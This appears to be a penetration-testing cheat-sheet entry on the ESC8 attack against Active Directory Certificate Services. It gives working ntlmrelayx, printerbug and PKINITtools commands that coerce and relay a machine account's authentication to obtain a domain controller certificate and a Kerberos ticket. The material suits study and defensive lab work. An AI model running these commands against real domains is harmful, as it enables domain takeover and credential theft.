`ESC8` as described in the Certified Pre-Owned paper is an `NTLM relay attack` targeting an `ADCS HTTP endpoint`. **ADCS** supports multiple enrollment methods, including `web enrollment`, which by default occurs over HTTP. A certificate authority configured to allow web enrollment typically hosts the following application at `/CertSrv`.

We can use Impacket-NTLMRelayx to listen for inbound connections and relay them to the web enrollment service:

```sh
impacket-ntlmrelayx -t http://<IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

>[!note]
>The value passed to --template may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like certipy.

One way to force machine accounts to **authenticate** against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py); for example, you can make `10.129.200.45 (WEB01)` authenticate against `10.10.14.99 (attacker host)`, or `10.129.111.20 (DC02)` authenticate against `10.10.17.55 (attacker host)`.

```sh
python3 printerbug.py kyakei.com/ttyler:"sugar_1"@10.129.200.45 10.10.14.99
```

Once you’ve got the certificate (`DC01$.pfx`) from `Impacket-NTLMRelayx`, you can use **PKINITtools** to request a TGT as the machine account (`DC01$`):

```sh
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt


python3 gettgtpkinit.py -cert-pfx DC01$.pfx -dc-ip 10.129.200.45 'kyakei.com/dc01$' dc.ccache

export KRB5CCNAME=dc.ccache
```



